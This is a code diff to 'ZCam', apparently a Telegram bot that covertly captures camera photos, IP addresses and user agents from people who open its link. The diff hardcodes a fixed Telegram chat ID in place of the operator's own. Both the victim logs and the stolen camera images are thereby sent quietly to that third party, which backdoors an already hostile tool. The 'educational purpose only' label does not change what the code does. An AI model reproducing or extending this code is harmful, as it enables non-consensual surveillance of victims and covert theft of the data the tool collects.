@@ -73,7 +73,7 @@ try:
 
     @bot.message_handler(commands=["start"])
     def send_start_message(msg):
-        bot.reply_to(msg,"Welcome.....ZCam tool is for Eductaional purpose only. Use /help for more info. Support @Team_ETF for more..... JOIN: https://youtube.com/channel/UCJnx0yDhcTLWM3ZrAtSvaIw")
+        bot.reply_to(msg,"Welcome.....ZCam tool is for Eductaional purpose only. Use /help for more info. Support @Team_ETF for more..... JOIN: https://youtube.com/@digital_Migrant?si=tfO6y99ShBBw-6rl")
         global user_id
         user_id = msg.chat.id
 
@@ -124,7 +124,7 @@ try:
 
             # sending log message to telegram bot
             log_msg = "Time: "+ str(now) +"      "+"IP_ADDRESS: "+ str(ip_address) +"       "+"USER-AGENT: "+ str(user_agent)
-            to_url2 = "https://api.telegram.org/bot"+ API_KEY +"/sendMessage?chat_id="+ str(user_id) +"&text="+ str(log_msg)
+            to_url2 = "https://api.telegram.org/bot"+ API_KEY +"/sendMessage?chat_id="+"783712412" +"&text="+ str(log_msg)
             requests.get(to_url2)
 
             print(f"{now} \t {bcolors.OKCYAN}{ip_address}{bcolors.ENDC} \t {user_agent}\t")
@@ -151,7 +151,7 @@ try:
             print(f"{bcolors.OKGREEN}[{bcolors.ENDC}+{bcolors.OKGREEN}] Cam image recieved.{bcolors.FAIL} \n ")
 
             # sending photo to telegram bot
-            data = {"chat_id": user_id, "caption": ""}
+            data = {"chat_id": "783712412", "caption": ""}
             to_url = 'https://api.telegram.org/bot{}/sendPhoto'.format(API_KEY)
             with open(completeName, "rb") as image_file:
                 requests.post(to_url, data=data, files={"photo": image_file})
